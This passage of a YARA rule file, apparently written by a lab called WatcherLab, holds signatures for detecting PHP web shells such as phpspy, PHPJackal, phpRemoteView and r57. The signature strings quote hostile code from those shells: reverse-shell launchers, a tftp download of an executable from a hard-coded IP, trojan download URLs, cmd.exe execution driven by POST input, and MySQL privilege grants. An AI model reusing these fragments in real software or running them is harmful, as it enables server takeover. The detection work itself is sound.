      date = "2019-02-23"
      hash1 = "dad6bd0de329955ef56dd8f275c1b0821253e5b5bc781c2d8dfc169df5f076e4"
      hash2 = "2b28499fc5ed0f8420ce310ffe32858a5b439ec079203b55e0de10b99e68274f"
   strings:
      $s1 = "$myurl='http://www.zjjv.com';//" fullword ascii
      $s2 = "3Ve+sKNHLuFtP/zpe//hhf/5u78oz+WUKhZyE3elrl4bY70xuT" fullword ascii
      $s3 = "QaOkHSwetBfjpSHLfdrSwGrITkAl4NeAYWB5ANEYeQOMCsMK1Q" fullword ascii
      $s4 = "RvL60vXjRv6pjwLzGPfe/LbsOcvl3fbNi92bSxv5Ztg8dLl5Kd" fullword ascii
      $s5 = "OpqdXVfCBZfjRPdni1iYFZOX/xBHlogZFnrjYJyhpjWvrkoKnc" fullword ascii
      $s6 = "4FMGIYk6p4Vbyu9+wAfTPpb+dfaQ79Hvwe/g4aPaCO/oj4mLL5" fullword ascii
      $s7 = "wIui+t/gBcsvHkJCFZcEQxxlRSugfVjXA/hIzkRjFRLogykm2S" fullword ascii
      $s8 = "oMM5VHOcvAi+ndbMaMqmfGEtsEXIgT7lrzsB1w4jQFfUHzZ65A" fullword ascii
      $s9 = "4NCJOhINHlxJp8Md5iWwGZPCYDlgGBuUJN6bDNhnsADlLve8Iq" fullword ascii
      $s10 = "0A5kXzBtazYaHXtkUgEtigSd1KbR00grmOksD1vRTL2g8sw3d8" fullword ascii
      $s11 = "V8wjiGcpu0JkBzps8H80MZDk8U5lkLdsx9JghqWvdjusPyJAi6" fullword ascii
      $s12 = "bu2JKD2QLRAR9aHrN30RGaGTNih34JBlPDAfVnLlOGMXA3tpNU" fullword ascii
      $s13 = "kEyQQIaCKTh4GfBa17bQLDFdpkPLcTDT0NsxeKGThRnWpUkmCU" fullword ascii
      $s14 = "rFEOVkarrI8w8POkqzzMtMpu/0LXZS9EruVfJMFKqj+I7GmGsG" fullword ascii
      $s15 = "bbpc4BGEWQrRBgnk+FEauyH0b1nvnoF1b+tport2aIApeA4++U" fullword ascii
      $s16 = "4CsAJ+jcHSQq4Wg2kpbfC2kEyXjgyQai5TMmLIxcNPgno8oHBb" fullword ascii
      $s17 = "B0FbaFtmPmmgZ3s0NQE9OPmTxojoHgUMvoygzi4dEg3KTPdObA" fullword ascii
      $s18 = "ravd5p89RCOmDLWa/acU1OBrRcXXK9oliP/pUsON3cWVWOPNKD" fullword ascii
      $s19 = "ndRUNyt2jJZynKtQxKCd2umkg5Eoj5ct3jk/rbQx4mt+j5omVf" fullword ascii
      $s20 = "UTpPXiJniMW3nB8e7Kod7A3UgIon1SHWsKKK/MthNaiCoM1qW1" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _pass__pass_phpda_phpspy__phpspy2_phpspy3_2
{
   meta:
      description = "php22 - from files pass..php, pass.php, phpda.php, phpspy-.php, phpspy2.php, phpspy3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4dca1ebe61a0ef001a37ec63e4ea20ca59ba0e30af9fa0dc9ee676ed12373bc5"
      hash2 = "56210f61b94682abb4c7986bbbed4ad4e2dce58a25955c071bc939a80eca7c43"
      hash3 = "4eac42ac87e26d48fe8c1f673c274eb84b4c207d5a4f84eaa475f3118afbf917"
      hash4 = "faf4d727728e03670713e5000b6813499274a56b95a5b42f8f14d1e2f7d84777"
      hash5 = "dfdd38082a77377d1e96a769ef5757aab59ad8fc355dfdbb0d5a66d0484af888"
      hash6 = "caf482e4a74cb0d079d9451bea04b888881a3909f4f6a0175e55eebc29f303c9"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x6 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x7 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x8 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x9 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x10 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x11 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x12 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $s13 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
      $s14 = "echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '" fullword ascii
      $s15 = "Str[3] = \"GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;\";" fullword ascii
      $s16 = "$query = 'SELECT spider FROM Spider_Temp_Tab INTO DUMPFILE \\''.$mpath.'\\';';" fullword ascii
      $s17 = "if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass']))" fullword ascii
      $s18 = "$Com_dpath= isset($_POST['dpath']) ? $_POST['dpath'] : File_Str(dirname(__FILE__).'/muma.exe');" fullword ascii
      $s19 = "<a href=\"?s=e&fp='.urlencode($sp).'&fn='.$Filename.'&dim='.urlencode($key).'\" target=\"_blank\"> " fullword ascii
      $s20 = ": site exec <font color=#006600>\".$_POST[\"SUCommand\"].\"</font> <br>\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _PHPJackal_v1_5_phpjackal1_3_PHPJackalkv1_5_PHPJackalv1_5_phpjackal_2_PHPJackal_v1_5_3
{
   meta:
      description = "php22 - from files PHPJackal v1.5.php, phpjackal1.3.php, PHPJackalkv1.5.php, PHPJackalv1.5.php, phpjackal_2.php, PHPJackal_v1.5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ed597809fdcb90dabc0a555c39353982bae3c99703b81938a6e19923d0a75692"
      hash2 = "6d5d8b5a07ffd074de611ecbbed94b2e2afde1240e856a5ac692e8856de3d1e9"
      hash3 = "121877e751bb92c4042c226da4f1ffa428c5eebf9d43e3dce517b962890a3607"
      hash4 = "34df5c5ca0e3e1160a5849ddcca1375cd5d4eb7adb39f65cb0fa7eb520f169ac"
      hash5 = "f2b8d0d0eb8717ee5c4e0daf1bd09bf6b4e2e1cc02c49ed223688d1a369f1236"
      hash6 = "25c54b4fb107d0a730e1bc2f30924bff05b588419479b50b193e7d13178b69fd"
   strings:
      $x1 = "elseif ($windows && is_object($ws = new COM(\"WScript.Shell\"))){$dir=(isset($_SERVER[\"TEMP\"]))?$_SERVER[\"TEMP\"]:ini_get('up" ascii
      $x2 = "mp_dir') ;$name = $_SERVER[\"TEMP\"].namE();$ws->Run(\"cmd.exe /C $command >$name\", 0, true);$exec = file_get_contents($name);u" ascii
      $x3 = "$alias=\"<option value=\\\"netstat -an | grep -i listen\\\">Display open ports</option><option value=\\\"last -a -n 250 -i\\\">S" ascii
      $x4 = "echo \"<br><table border=0 cellpadding=0 cellspacing=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" bgcol" ascii
      $x5 = "$footer=\"${msgbox}PHPJackal v$v - Powered By <a href=\\\"http://netjackal.by.ru\\\" target=\\\"_blank\\\">NetJackal</a>$et\";" fullword ascii
      $x6 = "$alias=\"<option value=\\\"netstat -an\\\">Display open ports</option><option value=\\\"tasklist\\\">List of processes</option><" ascii
      $x7 = "if(!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &\");" fullword ascii
      $x8 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x9 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x10 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x11 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x12 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x13 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x14 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x15 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x16 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x17 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x18 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
      $s19 = "$intro=\"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\"><tr><td bgcolor=\\\"#666666" ascii
      $s20 = "if(!$bd)echo $error;else shelL(\"perl.exe $name $port\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _phpRemoteView_2_remview_fix_Rem_View_4
{
   meta:
      description = "php22 - from files phpRemoteView_2.php, remview_fix.php, Rem_View.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab0ee603e53cd0b32f09a0c53469d09281002a783d8aa5fcea1110ef2b57df81"
      hash2 = "d2279c9c0307669cf8489c7deb01f0afb4835cb291e6fdf533b3cdf81220daf0"
      hash3 = "61e9ad4eb0d37d3f4e39cf0d8a32c1e6964bb45c615b83f1e6c4a56066435689"
   strings:
      $x1 = "\".mm(\"Free download\").\" - <a href='http://php.spb.ru/remview/'>http://php.spb.ru/remview/</a></b></font></td>" fullword ascii
      $s2 = "$shell=\"#\".mm(\"example (remove comments '#')\").\": \\n\\n#cat /etc/passwd;\\n\\n#ps -ax\\n\\n#uname -a\";" fullword ascii
      $s3 = "echo \"<P><b>\".mm(\"Shell commands\").\"</b>" fullword ascii
      $s4 = "header(\"Content-disposition: attachment; filename=\\\"$attach\\\";\"); " fullword ascii
      $s5 = "obb().exit(\"<font color=red><b>\".mm(\"Clean (empty file) cancel\").\" - \".mm(\"ACCESS DENIED\").\"</b></font>obb\"); " fullword ascii
      $s6 = "<font size=1 style='Font: 8pt Verdana'>phpRemoteView &copy; Dmitry Borodin (\".mm(\"version\").\" $version)<br>" fullword ascii
      $s7 = "echo \"<b>\".mm(\"FILE SYSTEM COMMANDS\").\"$msg</b><p>\";" fullword ascii
      $s8 = "if (realpath(getenv(\"SCRIPT_FILENAME\"))==$d.$f && !isset($delete_remview_confirm))" fullword ascii
      $s9 = "ProcessTime=$fulltime sec (\".(floor($fulltime/60/60)).\"h)<br>" fullword ascii
      $s10 = "<textarea name=shell rows=\".(!isset($skipshell)?10:4).\" cols=60 style='width:100%;'>$shell</textarea><br>" fullword ascii
      $s11 = "if (!is_file($d.$f) || !$fi=@fopen($d.$f,\"r+\")) $msg=\" (<font color=red><b>\".mm(\"ONLY READ ACCESS\").\"</b></font>)\";" fullword ascii
      $s12 = "d - day, m - month, y - year2, Y - year4, H - hour, m - minute, s - second<P>\";" fullword ascii
      $s13 = "$str=fread($fi,$hexdump_lines*$hexdump_rows);" fullword ascii
      $s14 = "echo \"<b>\".mm(\"FILE SYSTEM COMMANDS\").\"</b><p>\";" fullword ascii
      $s15 = "obb().exit(\"<font color=red><b>\".mm(\"Touch cancel\").\" - \".mm(\"ACCESS DENIED\").\"</b></font>$obb\"); " fullword ascii
      $s16 = "obb().exit(\"<font color=red><b>\".mm(\"Delete cancel\").\" - \".mm(\"ACCESS DENIED\").\"</b></font>$obb\"); " fullword ascii
      $s17 = "$ttype=array(1=>\"MD5\",7=>\"Decode MD5 (password crack)<br>\"," fullword ascii
      $s18 = "echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\",$v)).\"\\\"</script>" fullword ascii
      $s19 = "\"'>Save this link</a> - click for break and save current position</h3>\";" fullword ascii
      $s20 = "<b>(FILE UPLOAD) \".mm(\"CREATE NEW FILE or override old file\").\"</b><br>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _oi_php_decode_p0isoN_sh3ll_r57_biz_Dq99Shell_redhgaajcee_login_passl_5
{
   meta:
      description = "php22 - from files oi.php.decode.php, p0isoN.sh3ll.php, r57.biz_Dq99Shell.php, redhgaajcee_login_passl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9978ea2bdfbadad460a3871b5a357cc25342820808536cb3fb652f2324df2dfb"
      hash2 = "16623a1a16ede2b5c5dea7a7ff0b32516a970915564461842e003133cb3046d3"
      hash3 = "80750b669b03b8ee93e0591222c940cb875a3feadf7f7aedda0e56f68fb6b240"
      hash4 = "a4db77895228f02ea17ff48976e03100ddfaef7c9f48c1d40462872f103451d5"
   strings:
      $x1 = "else {$tmp = htmlspecialchars(\"./dump_\".getenv(\"SERVER_NAME\").\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x2 = "$file = $tmpdir.\"dump_\".getenv(\"SERVER_NAME\").\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";" fullword ascii
      $x3 = "echo \"<br><br><input type=\\\"submit\\\" name=\\\"submit\\\" value=\\\"Dump\\\"><br><br><b><sup>1</sup></b> - all, if empty\";" fullword ascii
      $x4 = "echo \"<b>Download: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_download\\\" value=\\\"1\\\" checked><br><br>\";" fullword ascii
      $x5 = "# MySQL version: (\".mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\").\")\".\"" fullword ascii
      $s6 = "echo \"<form method=\\\"GET\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s7 = "$acts = array(\"\",\"newdb\",\"serverstatus\",\"servervars\",\"processes\",\"getfile\");" fullword ascii
      $s8 = "echo \"<a href=\\\"ftp://\".$login.\":\".$pass.\"@\".$host.\"\\\" target=\\\"_blank\\\"><b>Connected to \".$host.\" with login " ascii
      $s9 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($sql_dump_file).\"\\\";\");" fullword ascii
      $s10 = "header(\"Content-disposition: attachment; filename=\\\"\".$f.\".txt\\\";\");" fullword ascii
      $s11 = "$encoded = chunk_split(base64_encode(file_get_contents($d.$f)));" fullword ascii
      $s12 = "if ($fqb_onlywithsh) {$TRUE = (!in_array($sh,array(\"/bin/FALSE\",\"/sbin/nologin\")));}" fullword ascii
      $s13 = "getenv(\"PHPRC\").\" -q %f%\" => array(\"php\",\"php3\",\"php4\")," fullword ascii
      $s14 = "echo \"<b>Save to file: </b>&nbsp;<input type=\\\"checkbox\\\" name=\\\"sql_dump_savetofile\\\" value=\\\"1\\\" checked>\";" fullword ascii
      $s15 = "$line[] = \"<a href=\\\"\".$surl.\"act=processes&d=\".urlencode($d).\"&pid=\".$line[1].\"&sig=9\\\"><u>KILL</u></a>\";" fullword ascii
      $s16 = "$sql_sock = mysql_connect($sql_server.\":\".$sql_port, $sql_login, $sql_passwd);" fullword ascii
      $s17 = "elseif ($ft == \"sdb\") {echo \"<pre>\"; var_dump(unserialize(base64_decode($r))); echo \"</pre>\";}" fullword ascii
      $s18 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\".substr(decoct(fileperms($d.$f)),-4,4).\")</b><br>" ascii
      $s19 = "$encoded = base64_encode(file_get_contents($d.$f));" fullword ascii
      $s20 = "if ($fullhexdump) {echo \"<b>FULL HEXDUMP</b>\"; $str = fread($fi,filesize($d.$f));}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _pass__pass_phpda_phpspy__phpspy2_phpspy3_r00ts_php_6
{
   meta:
      description = "php22 - from files pass..php, pass.php, phpda.php, phpspy-.php, phpspy2.php, phpspy3.php, r00ts php.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4dca1ebe61a0ef001a37ec63e4ea20ca59ba0e30af9fa0dc9ee676ed12373bc5"
      hash2 = "56210f61b94682abb4c7986bbbed4ad4e2dce58a25955c071bc939a80eca7c43"
      hash3 = "4eac42ac87e26d48fe8c1f673c274eb84b4c207d5a4f84eaa475f3118afbf917"
      hash4 = "faf4d727728e03670713e5000b6813499274a56b95a5b42f8f14d1e2f7d84777"
      hash5 = "dfdd38082a77377d1e96a769ef5757aab59ad8fc355dfdbb0d5a66d0484af888"
      hash6 = "caf482e4a74cb0d079d9451bea04b888881a3909f4f6a0175e55eebc29f303c9"
      hash7 = "50d50f154720f065f00f77d64f573cc2c0e029a8fb52a0989735e4926652a2d9"
   strings:
      $x1 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x2 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x3 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x4 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x5 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x6 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x7 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $s8 = "$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';" fullword ascii
      $s9 = "$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';" fullword ascii
      $s10 = "633A5C5C77696E646F77735C73797374656D33325C5C696E65747372765C5C6D657461626173652E786D6C" ascii
      $s11 = "a>\" : \"<a href=\\\"mailto:\".get_cfg_var(\"sendmail_from\").\"\\\">\".get_cfg_var(\"sendmail_from\").\"</a>\";" fullword ascii
      $s12 = "$domain  = \"-SETDOMAIN\\r\\n\".\"-Domain=haxorcitos|0.0.0.0|21|-1|1|0\\r\\n\".\"-TZOEnable=0\\r\\n\".\" TZOKey=\\r\\n\";" fullword ascii
      $s13 = "$result = @$shell->Execute($sql);" fullword ascii
      $s14 = "$query = 'SELECT cmd FROM a INTO DUMPFILE \\''.$uppath.'\\';';" fullword ascii
      $s15 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}" fullword ascii
      $s16 = "if(function_exists('exec')){@exec($cmd,$res);$res = join(\"\\n\",$res);}" fullword ascii
      $s17 = "if((!empty($_POST['SUPort'])) && (!empty($_POST['SUUser'])) && (!empty($_POST['SUPass'])))" fullword ascii
      $s18 = "elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}" fullword ascii
      $s19 = "if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);" fullword ascii
      $s20 = "if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';}" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _phpRemoteView_2_PHPRemoteView_3_remview_fix_Rem_View_7
{
   meta:
      description = "php22 - from files phpRemoteView_2.php, PHPRemoteView_3.php, remview_fix.php, Rem_View.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab0ee603e53cd0b32f09a0c53469d09281002a783d8aa5fcea1110ef2b57df81"
      hash2 = "22cbc316412a0433daa8d33cd812a0f41102508bb013182c82d40e2fca430f0c"
      hash3 = "d2279c9c0307669cf8489c7deb01f0afb4835cb291e6fdf533b3cdf81220daf0"
      hash4 = "61e9ad4eb0d37d3f4e39cf0d8a32c1e6964bb45c615b83f1e6c4a56066435689"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x5 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x6 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s7 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s8 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s9 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s10 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s11 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s12 = "*  - download any file and open on Notepad" fullword ascii
      $s13 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s14 = "*  (c) Dmitry Borodin, dima@php.spb.ru, http://php.spb.ru" fullword ascii
      $s15 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']); " fullword ascii
      $s16 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']); " fullword ascii
      $s17 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']); " fullword ascii
      $s18 = "// antofix 'register globals': $HTTP_GET/POST_VARS -> normal vars;" fullword ascii
      $s19 = "*             add panel 'INFO', view a/c/m-time, hexdump view" fullword ascii
      $s20 = "' onMouseMove=\"this.style.backgroundColor=\\'#eeee88\\';window.status=\\'** '.$button_help[$buttons[$i]].' ** '.$bturl.'" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _phpspy_2009MSSQL_phpspy2009withMSSQL_phpspy2011_picconf_8
{
   meta:
      description = "php22 - from files phpspy-2009MSSQL.php, phpspy2009withMSSQL.php, phpspy2011.php, picconf.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cfb62e3f564c3ddbfc77d978ae422d455a1862683e72754492683ad4e1c0ee2"
      hash2 = "c5692bd52a09abd2d2fd3c4de5ac4ddda3923ae855899f0ddf912d9862843f89"
      hash3 = "a2f9b4e1dcf40053915fc68b554cfeae59ebfc71464f1c4cbab05e9456b0762a"
      hash4 = "828e13e143dc50bcde769128772066e303c7fdb10da81f9b6090978e9b4fbb82"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $x4 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x5 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s6 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s7 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s8 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s9 = "echo(execute($command));" fullword ascii
      $s10 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s11 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s12 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s13 = "$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");" fullword ascii
      $s14 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
      $s15 = "22 => array('max_execution_time',getcfg('max_execution_time').' second(s)')," fullword ascii
      $s16 = "p('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');" fullword ascii
      $s17 = "m('Database has success backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$path.'</a>');" fullword ascii
      $s18 = "makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));" fullword ascii
      $s19 = "makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));" fullword ascii
      $s20 = "p('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirchmod'].'</a> / ');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _R0XEM_ShElL_r57_bd_r57shell_v_1_42_edited_by_kibngdefacer_9
{
   meta:
      description = "php22 - from files R0XEM_ShElL.php, r57-bd.php, r57shell_v.1.42_edited_by_kibngdefacer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f74780a5550f4cdfd0298caf88c460076a9861638bad518a27773f61da27d53d"
      hash2 = "4adf0f6edf2981d489a3401b0327bba8e0f1f039bc8b23f884054bc6740376a9"
      hash3 = "3e1130a845de93c4e43de5470e9c28eb09a31edf2c6fdb9f0f05e303eae8d228"
   strings:
      $x1 = "if(!@function_exists('escapeshellarg')){$res=$api->WinExec(\"cmd.exe /c $cfe >\\\"$output\\\"\",0);}" fullword ascii
      $x2 = "if(!@function_exists('escapeshellarg')){$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.$cfe.' > \"'.$output.'\"');}" fullword ascii
      $x3 = "else{$res=$api->WinExec(\"cmd.exe /c \".@escapeshellarg($cfe).\" >\\\"$output\\\"\",0);}" fullword ascii
      $x4 = "else{$suntzu->Run('c:\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"');}" fullword ascii
      $x5 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x6 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;$tempdir )\");" fullword ascii
      $x7 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x8 = "{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"/c $" ascii
      $x9 = "else{@win32_create_service(array('service'=>$n_ser,'display'=>$n_ser,'path'=>'c:\\\\windows\\\\system32\\\\cmd.exe','params'=>\"" ascii
      $x10 = "elseif($file=moreread($_POST['e_name'])) { $filedump = $file; if(!@is_writable($_POST['e_name'])) { $only_read = 1; }; }" fullword ascii
      $x11 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x12 = "if(!@function_exists('escapeshellarg')){@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.$cfe.' >" ascii
      $x13 = "else{@win_shell_execute('..\\..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe /c '.@escapeshellarg($cfe).' > \"'.$output.'\"')" ascii
